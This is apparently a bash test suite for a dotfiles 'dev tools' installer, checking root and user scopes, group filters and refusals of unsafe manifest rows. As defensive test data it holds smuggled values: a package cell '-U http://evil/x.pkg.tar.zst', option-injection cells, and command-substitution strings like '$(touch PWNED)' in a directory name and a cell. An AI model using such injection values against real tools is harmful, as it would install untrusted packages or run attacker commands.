#!/usr/bin/env bash
# Pure-bash tests for `dev tools install` and `dev tools check`. A fake project holds
# .dev/tools.tsv, LUA_INIT loads tests/lua/fake_env.lua so FAKE_UID and FAKE_OS (Linux) set the uid and system
# name, and uname (which pkg.lua reads) and pacman are stubs first on PATH, pacman recording every call and reporting nothing installed.
set -o pipefail

DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO="$(cd "$DIR/../.." && pwd)"
DEV="$REPO/dotfiles/bin/.local/bin/dev"
unset DOTFILES VERBOSE

TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT
STUBS="$TMP/stubs"
export LUA_INIT="@$REPO/tests/lua/fake_env.lua" FAKE_UID=1000 FAKE_OS=Linux
export CALLS="$TMP/calls" RECORD="$TMP/record"
if [ "$EUID" -eq 0 ]; then REAL_ROOT=1; else REAL_ROOT=0; fi

skip_user() {
    printf 'SKIP - runs as a user through FAKE_UID, which a real uid 0 never loads\n'
}
mkdir -p "$STUBS"
cat >"$STUBS/uname" <<'STUB'
#!/bin/sh
echo Linux
STUB
cat >"$STUBS/pacman" <<'STUB'
#!/bin/sh
echo "pacman $*" >>"$CALLS"
[ "$1" != -Q ]
STUB
chmod +x "$STUBS"/*

fails=0

assert_eq() {
    local desc="$1" got="$2" want="$3"
    if [ "$got" = "$want" ]; then
        printf 'ok   - %s\n' "$desc"
    else
        printf 'FAIL - %s\n       got:  %q\n       want: %q\n' "$desc" "$got" "$want"
        fails=$((fails + 1))
    fi
}

assert_contains() {
    local desc="$1" haystack="$2" needle="$3"
    case "$haystack" in
    *"$needle"*) printf 'ok   - %s\n' "$desc" ;;
    *)
        printf 'FAIL - %s\n       missing: %q\n       in:      %q\n' "$desc" "$needle" "$haystack"
        fails=$((fails + 1))
        ;;
    esac
}

assert_not_contains() {
    local desc="$1" haystack="$2" needle="$3"
    case "$haystack" in
    *"$needle"*)
        printf 'FAIL - %s\n       unexpected: %q\n' "$desc" "$needle"
        fails=$((fails + 1))
        ;;
    *) printf 'ok   - %s\n' "$desc" ;;
    esac
}

# tools <dir> <args...>: run dev tools in a project with the stubs first on PATH.
tools() {
    local dir="$1"
    shift
    : >"$CALLS"
    (cd "$dir" && PATH="$STUBS:$PATH" "$DEV" tools "$@")
}

cat >"$TMP/installer.sh" <<'STUB'
#!/bin/sh
echo "ran $*" >>"$RECORD"
STUB

proj="$TMP/proj"
mkdir -p "$proj/.dev"
cat >"$proj/.dev/tools.tsv" <<TSV
name       binary          brew    pacman              dnf
pkg-a      pkg-a-zzz       pkg-a   pkg-a               pkg-a
aur-b      aur-b-zzz       aur-b   aur:aur-b           copr:copr-b,repo:o/p
scr-c      scr-c-zzz       -       script:$TMP/installer.sh   -
crg-d      crg-d-zzz       -       cargo:crg-d         -
TSV

if [ "$REAL_ROOT" = 0 ]; then
    out="$(tools "$proj" install --dry-run)"
    assert_eq "install with no scope exits 0" "$?" "0"
    assert_contains "no scope plans a package row" "$out" "pacman -S --needed --noconfirm -- pkg-a"
    assert_contains "no scope plans an AUR row" "$out" "aur-b"
    assert_contains "no scope plans a script row" "$out" "bash $TMP/installer.sh"
    assert_contains "no scope plans a cargo row" "$out" "crg-d"
    assert_not_contains "no scope skips nothing" "$out" "skipped third-party"
else
    skip_user
fi

if [ -x /usr/bin/pacman ] && [ "$EUID" -eq 0 ]; then
    out="$(FAKE_UID=0 tools "$proj" install --system --dry-run)"
    assert_eq "--system as root exits 0" "$?" "0"
    assert_contains "--system plans a package row" "$out" "pacman -S --needed --noconfirm -- pkg-a"
    assert_not_contains "--system skips a script row" "$out" "installer.sh"
    assert_not_contains "--system skips a cargo row" "$out" "crg-d"
    assert_not_contains "--system does not plan the AUR build" "$out" "makepkg"
    assert_contains "--system names the skipped AUR row in one line" "$out" "skipped third-party rows (built into the image, not installed with root): aur-b (aur:)"
    assert_eq "--system prints the skip line once" "$(printf '%s\n' "$out" | grep -c 'skipped third-party')" "1"
else
    printf 'SKIP - root package driver runs need the real /usr/bin/pacman and real root with a root-owned project chain\n'
fi

if [ "$REAL_ROOT" = 0 ]; then
    out="$(FAKE_UID=1000 tools "$proj" install --user --dry-run)"
    assert_eq "--user as a user exits 0" "$?" "0"
    assert_not_contains "--user skips a package row" "$out" "pacman -S"
    assert_not_contains "--user skips an AUR row" "$out" "aur-b"
    assert_contains "--user plans a script row" "$out" "bash $TMP/installer.sh"
    assert_contains "--user plans a cargo row" "$out" "crg-d"
    assert_not_contains "--user does not mention the skipped rows" "$out" "skipped"

    : >"$RECORD"
    FAKE_UID=1000 tools "$proj" install --user scr-c >/dev/null
    assert_eq "--user really runs the script row" "$(cat "$RECORD")" "ran "

    out="$(FAKE_UID=1000 tools "$proj" install --system --dry-run 2>&1)"
    assert_eq "--system as a user exits 1" "$?" "1"
    assert_contains "--system as a user says it needs root" "$out" "needs root"
    assert_not_contains "--system as a user plans nothing" "$out" "pacman -S"
else
    skip_user
fi
out="$(FAKE_UID=0 tools "$proj" install --user --dry-run 2>&1)"
assert_eq "--user as root exits 1" "$?" "1"
assert_contains "--user as root refuses" "$out" "refuses to run as root"
out="$(FAKE_UID=0 tools "$proj" install --system --user --dry-run 2>&1)"
assert_eq "--system with --user exits 2" "$?" "2"
assert_contains "--system with --user says so" "$out" "--system and --user cannot be combined"
out="$(FAKE_UID=0 tools "$proj" install --dry-run 2>&1)"
assert_eq "root with no scope exits 2" "$?" "2"
assert_contains "root with no scope says to pass --system" "$out" "as root, pass --system"
assert_not_contains "root with no scope plans nothing" "$out" "pacman -S"
out="$(FAKE_UID=0 tools "$proj" install --force pkg-a 2>&1)"
assert_eq "root with no scope and a tool name exits 2" "$?" "2"
if [ "$REAL_ROOT" = 0 ]; then
    out="$(tools "$proj" install --bogus 2>&1)"
    assert_eq "an unknown flag exits 2" "$?" "2"
    assert_contains "an unknown flag is named" "$out" "unknown flag --bogus"
    out="$(tools "$proj" install --dry-run no-such-tool-zzz 2>&1)"
    assert_eq "an unknown tool exits 2" "$?" "2"
    assert_contains "an unknown tool is named" "$out" "unknown tool: no-such-tool-zzz"
    out="$(tools "$proj" install --force 2>&1)"
    assert_eq "--force without a tool exits 2" "$?" "2"

    out="$(FAKE_UID=1000 tools "$proj" install --dry-run pkg-a)"
    assert_contains "naming a tool installs only that tool" "$out" "pkg-a"
    assert_not_contains "naming a tool leaves the others" "$out" "crg-d"
else
    skip_user
fi

cat >"$proj/.dev/tools.tsv.bad" <<TSV
name       binary          brew    pacman              dnf
opt-a      opt-a-zzz       -       "-U http://evil/x.pkg.tar.zst"   -
spc-b      spc-b-zzz       -       "pkg-b --config=/x" -
dash-c     dash-c-zzz      -       --config=/x         -
repo-d     repo-d-zzz      -       copr:ok,repo:a/b/c  -
good-e     good-e-zzz      -       good-e              -
rock-f     rock-f-zzz      -       luarocks:rock-f     -
TSV
badproj="$TMP/badproj"
mkdir -p "$badproj/.dev"
cp "$proj/.dev/tools.tsv.bad" "$badproj/.dev/tools.tsv"
rm "$proj/.dev/tools.tsv.bad"
if [ "$REAL_ROOT" = 0 ]; then
    out="$(tools "$badproj" install --dry-run 2>&1)"
    assert_eq "bad package cells fail the install" "$?" "1"
    assert_contains "an option-like cell is refused" "$out" "opt-a: refusing the package"
    assert_contains "a cell with a space is refused" "$out" "spc-b: refusing the package"
    assert_contains "a leading dash is refused" "$out" "dash-c: refusing the package"
    assert_contains "a bad repo is refused" "$out" "repo-d: refusing the package"
    assert_contains "the failed rows are named" "$out" "install failed: opt-a spc-b dash-c repo-d"
    assert_contains "a good row still plans" "$out" "pacman -S --needed --noconfirm -- good-e"
    assert_not_contains "no refused row reaches pacman" "$out" "pacman -S --needed --noconfirm -- -U"
else
    skip_user
fi
if [ -x /usr/bin/pacman ] && [ "$EUID" -eq 0 ]; then
    out="$(FAKE_UID=0 tools "$badproj" install --system --dry-run 2>&1)"
    assert_contains "--system skips luarocks like aur and copr" "$out" "rock-f (luarocks:)"
    assert_not_contains "--system does not plan the rock" "$out" "luarocks install"
else
    printf 'SKIP - root package driver runs need the real /usr/bin/pacman and real root with a root-owned project chain\n'
fi
if [ "$REAL_ROOT" = 0 ]; then
    out="$(tools "$badproj" install --dry-run rock-f 2>&1)"
    assert_contains "no scope still plans luarocks" "$out" "luarocks install rock-f"

    out="$(tools "$proj" check 2>&1)"
    assert_eq "check exits 1 when a tool is missing" "$?" "1"
    assert_contains "check reports the missing tool" "$out" "[ ] pkg-a"
    out="$(tools "$proj" check --bogus 2>&1)"
    assert_eq "check with a bad flag exits 2" "$?" "2"
    assert_contains "check names the bad flag" "$out" "dev tools check: unknown flag --bogus"
    assert_contains "check shows the curated help" "$out" "Set up a machine or project"

    hostile="$TMP/x'\$(touch PWNED)"
    mkdir -p "$hostile/.dev"

    # shellcheck disable=SC2016  # the cell is literal text
    printf 'name binary pacman\n$(>PWNED) zzz-none-bin x\n' >"$hostile/.dev/tools.tsv"
    out="$(tools "$hostile" check 2>&1)"
    assert_eq "check reads a manifest under a hostile project name" "$?" "1"

    # shellcheck disable=SC2016  # the cell is literal text
    assert_contains "check shows the hostile cell as text" "$out" '$(>PWNED)'
    assert_eq "a hostile project name and cell run nothing" "$(find "$TMP" -name PWNED | wc -l | tr -d ' ')" "0"

    empty="$TMP/empty"
    mkdir -p "$empty/.dev"
    out="$(tools "$empty" install)"
    assert_eq "install without a manifest exits 0" "$?" "0"
    assert_eq "install without a manifest says so" "$out" "no .dev/tools.tsv"
    out="$(tools "$empty" check)"
    assert_eq "check without a manifest exits 0" "$?" "0"
    assert_eq "check without a manifest says so" "$out" "no .dev/tools.tsv"
    out="$(FAKE_UID=1000 tools "$empty" install --system 2>&1)"
    assert_eq "install --system without a manifest needs no root" "$?" "0"

    relproj="$TMP/relproj"
    mkdir -p "$relproj/.dev" "$relproj/sub"
    printf 'name binary pacman\nrel rel-zzz script:rel.sh\n' >"$relproj/.dev/tools.tsv"
    cat >"$relproj/rel.sh" <<'STUB'
#!/bin/sh
echo "ran from $PWD" >>"$RECORD"
STUB
    : >"$RECORD"
    FAKE_UID=1000 tools "$relproj/sub" install --user rel >/dev/null
    assert_eq "a script: path is relative to the project root" "$(cat "$RECORD")" "ran from $(cd "$relproj" && pwd -P)"

    out="$(tools "$REPO" install --dry-run 2>&1)"
    assert_eq "dotfiles' own .dev/tools.tsv installs" "$?" "0"
    assert_contains "dotfiles' manifest plans its muchsync row" "$out" "muchsync"
else
    skip_user
fi
if [ -x /usr/bin/pacman ] && [ "$EUID" -eq 0 ]; then
    out="$(FAKE_UID=0 tools "$REPO" install --system --dry-run 2>&1)"
    assert_not_contains "dotfiles' --system skips its script rows" "$out" "install-muchsync.sh"
    assert_contains "dotfiles' --system names its AUR rows" "$out" "skipped third-party"
else
    printf 'SKIP - root package driver runs need the real /usr/bin/pacman and real root with a root-owned project chain\n'
fi
assert_eq "the old manifest path is gone" "$([ -e "$REPO/tools.tsv" ] && echo present || echo gone)" "gone"

copy="$TMP/image/usr-local-lib-dotfiles"
mkdir -p "$copy/dotfiles/bin/.local/bin"
cp -R "$REPO/scripts" "$copy/scripts"
cp "$DEV" "$copy/dotfiles/bin/.local/bin/dev"
mkdir -p "$copy/dotfiles/bin/.local/share"
cp -R "$REPO/dotfiles/bin/.local/share/dev" "$copy/dotfiles/bin/.local/share/dev"
chmod -R a-w "$copy"
out="$(FAKE_UID=0 HOME="$TMP/nohome" tools "$proj" install --system --dry-run 2>&1)"
out_copy="$(cd "$proj" && FAKE_UID=0 HOME="$TMP/nohome" PATH="$STUBS:$PATH" "$copy/dotfiles/bin/.local/bin/dev" tools install --system --dry-run 2>&1)"
assert_eq "a read-only copy of dotfiles gives the same plan" "$out_copy" "$out"
assert_eq "a read-only copy leaves HOME unmade" "$([ -e "$TMP/nohome" ] && echo made || echo none)" "none"
chmod -R u+w "$copy"

mkdir -p "$proj/.dev/tools"
cat >"$proj/.dev/tools/install.sh" <<'STUB'
#!/bin/sh
echo "OVERRIDE RAN $*"
STUB
cat >"$proj/.dev/tools/extra.sh" <<'STUB'
#!/bin/sh
echo "extra ran"
STUB
cat >"$proj/.dev/tools.sh" <<'STUB'
#!/bin/sh
echo "FLAT OVERRIDE RAN $*"
STUB
chmod +x "$proj/.dev/tools/install.sh" "$proj/.dev/tools/extra.sh" "$proj/.dev/tools.sh"
if [ -x /usr/bin/pacman ] && [ "$EUID" -eq 0 ]; then
    out="$(FAKE_UID=0 tools "$proj" install --system --dry-run 2>&1)"
    assert_not_contains "a project script cannot replace a built-in tools subcommand" "$out" "OVERRIDE RAN"
    assert_contains "the built-in still runs" "$out" "pacman -S --needed --noconfirm -- pkg-a"
else
    printf 'SKIP - root package driver runs need the real /usr/bin/pacman and real root with a root-owned project chain\n'
fi
if [ "$REAL_ROOT" = 0 ]; then
    out="$(tools "$proj" --help)"
    assert_not_contains "a built-in subcommand is not marked as an override" "$out" "(override)"
    out="$(cd "$proj" && PATH="$STUBS:$PATH" "$DEV" help)"
    assert_not_contains "dev help does not mark the noun as an override" "$out" "(override)"
    out="$(cd "$proj" && PATH="$STUBS:$PATH" "$DEV" help tools install)"
    assert_not_contains "dev help tools install is not an override" "$out" "(override)"
    out="$(FAKE_UID=1000 tools "$proj" extra 2>&1)"
    assert_eq "a project-only tools subcommand runs as a user" "$out" "extra ran"
else
    skip_user
fi
if [ "$REAL_ROOT" = 1 ]; then
    out="$(FAKE_UID=1000 FAKE_OS=Darwin tools "$proj" extra 2>&1)"
    assert_eq "at real root the seam is inert and a project subcommand is refused" "$?" "2"
    assert_contains "at real root a fake user uid still gets the root refusal" "$out" "as root, dev runs only tools install and tools check"
    assert_not_contains "at real root the fake user runs nothing" "$out" "extra ran"
fi
out="$(FAKE_UID=0 tools "$proj" extra 2>&1)"
assert_eq "dev refuses a project tools subcommand as root" "$?" "2"
assert_contains "the root refusal says what root may run" "$out" "as root, dev runs only tools install and tools check"
assert_not_contains "the root refusal runs nothing" "$out" "extra ran"
printf '#!/bin/sh\necho flat ran\n' >"$proj/.dev/verify-prod.sh"
chmod +x "$proj/.dev/verify-prod.sh"
if [ "$REAL_ROOT" = 0 ]; then
    assert_eq "a flat project verb runs as a user" "$(cd "$proj" && FAKE_UID=1000 PATH="$STUBS:$PATH" "$DEV" verify-prod)" "flat ran"
else
    skip_user
fi
out="$(cd "$proj" && FAKE_UID=0 PATH="$STUBS:$PATH" "$DEV" verify-prod 2>&1)"
assert_eq "dev refuses a flat project verb as root" "$?" "2"
assert_contains "the flat refusal says what root may run" "$out" "as root, dev runs only tools install and tools check"
out="$(FAKE_UID=0 tools "$proj" check 2>&1)"
assert_not_contains "the built-in tools check ignores .dev/tools.sh" "$out" "FLAT OVERRIDE"
rm -f "$proj/.dev/tools.sh" "$proj/.dev/tools/install.sh"
if [ "$REAL_ROOT" = 0 ]; then
    out="$(tools "$proj" --help)"
    assert_contains "dev tools --help lists install" "$out" "install"
    assert_contains "dev tools --help lists check" "$out" "check"
    out="$(tools "$proj" frobnicate 2>&1)"
    assert_eq "an unknown tools subcommand exits 2" "$?" "2"
    assert_contains "an unknown tools subcommand is named" "$out" "dev tools: unknown subcommand frobnicate"
    out="$(cd "$proj" && PATH="$STUBS:$PATH" "$DEV" help)"
    assert_contains "dev help lists the tools noun" "$out" "tools"
    out="$(cd "$proj" && "$DEV" --remote tools install 2>&1)"
    assert_eq "--remote refuses tools install" "$?" "2"
    assert_contains "--remote names the refused subcommand" "$out" "dev tools install: runs on this machine only, so --remote does not apply"
    out="$(cd "$proj" && "$DEV" --remote tools check 2>&1)"
    assert_eq "--remote refuses tools check" "$?" "2"
else
    skip_user
fi
gproj="$TMP/gproj"
mkdir -p "$gproj/.dev"
cat >"$gproj/.dev/tools.tsv" <<TSV
name       binary          brew    pacman              dnf                    groups
pkg-a      pkg-a-zzz       pkg-a   pkg-a               pkg-a                  base
aur-b      aur-b-zzz       aur-b   aur:aur-b           copr:copr-b,repo:o/p   base
scr-c      scr-c-zzz       -       script:$TMP/installer.sh   -               rust
crg-d      crg-d-zzz       -       cargo:crg-d         -                      base,rust
oth-e      oth-e-zzz       oth-e   oth-e               oth-e                  -
TSV

if [ "$REAL_ROOT" = 0 ]; then
    out="$(tools "$gproj" install --dry-run --group base)"
    assert_eq "--group base exits 0" "$?" "0"
    assert_contains "--group base plans a base row" "$out" "pkg-a"
    assert_contains "--group base plans a base,rust row" "$out" "crg-d"
    assert_not_contains "--group base skips a rust row" "$out" "installer.sh"
    assert_not_contains "--group base skips an ungrouped row" "$out" "oth-e"
    out="$(tools "$gproj" install --dry-run --group rust)"
    assert_contains "--group rust plans a rust row" "$out" "installer.sh"
    assert_contains "--group rust plans a base,rust row" "$out" "crg-d"
    assert_not_contains "--group rust skips a base row" "$out" "pkg-a"
    out="$(tools "$gproj" check --group rust 2>&1)"
    assert_contains "check --group rust reports a rust row" "$out" "scr-c"
    assert_contains "check --group rust reports a base,rust row" "$out" "crg-d"
    assert_not_contains "check --group rust skips a base row" "$out" "pkg-a"
    assert_not_contains "check --group rust skips an ungrouped row" "$out" "oth-e"
    out="$(tools "$gproj" check --group nope 2>&1)"
    assert_eq "check with an unknown group exits 2" "$?" "2"
    assert_contains "check names the unknown group" "$out" "unknown group: nope"
    out="$(tools "$gproj" install --dry-run --group nope 2>&1)"
    assert_eq "install with an unknown group exits 2" "$?" "2"
    assert_contains "install names the unknown group" "$out" "unknown group: nope"
    out="$(tools "$gproj" install --dry-run --group base oth-e 2>&1)"
    assert_eq "a named tool outside the group exits 2" "$?" "2"
    assert_contains "the usage error names the tool" "$out" "tool oth-e is not in group base"
    out="$(tools "$gproj" install --dry-run --group 2>&1)"
    assert_eq "--group without a name exits 2" "$?" "2"
    out="$(FAKE_UID=1000 tools "$gproj" install --user --dry-run --group base)"
    assert_contains "--user --group plans the cargo row" "$out" "crg-d"
    assert_not_contains "--user --group skips a package row" "$out" "pacman -S"
    assert_not_contains "--user --group skips a rust-only script row" "$out" "installer.sh"
else
    skip_user
fi

if [ -x /usr/bin/pacman ] && [ "$EUID" -eq 0 ]; then
    out="$(FAKE_UID=0 tools "$gproj" install --system --dry-run --group base)"
    assert_eq "--system --group base as root exits 0" "$?" "0"
    assert_contains "--system --group plans the package row" "$out" "pacman -S --needed --noconfirm -- pkg-a"
    assert_not_contains "--system --group skips a cargo row" "$out" "crg-d"
    assert_not_contains "--system --group skips an ungrouped row" "$out" "oth-e"
    assert_contains "--system --group names the skipped AUR row" "$out" "skipped third-party rows (built into the image, not installed with root): aur-b (aur:)"
    out="$(FAKE_UID=0 tools "$REPO" install --system --dry-run --group base 2>&1)"
    assert_eq "dotfiles' manifest --system --group base exits 0" "$?" "0"
    assert_not_contains "dotfiles' --group base leaves out a rust row" "$out" "cargo-nextest"
    out="$(FAKE_UID=0 tools "$gproj" install --system --group rust 2>&1)"
    assert_eq "--system --group rust with only user-scope rows exits 0" "$?" "0"
    assert_not_contains "--system --group rust installs nothing" "$out" "pacman -S"
    assert_eq "--system --group rust ran no package manager" "$(grep -c 'pacman -S' "$CALLS")" "0"
    assert_not_contains "--system --group rust skips no third-party row" "$out" "skipped"
else
    printf 'SKIP - root package driver runs need the real /usr/bin/pacman and real root with a root-owned project chain\n'
fi
if [ "$REAL_ROOT" = 0 ]; then
    out="$(tools "$gproj" install --dry-run --group "" 2>&1)"
    assert_eq "an empty --group name exits 2" "$?" "2"
    assert_contains "an empty --group name is an unknown group" "$out" "unknown group: "
    out="$(tools "$gproj" check --group "" 2>&1)"
    assert_eq "check with an empty --group name exits 2" "$?" "2"

else
    skip_user
fi
if [ "$fails" -gt 0 ]; then
    printf '\n%d failure(s)\n' "$fails"
    exit 1
fi
printf '\nall tools tests passed\n'
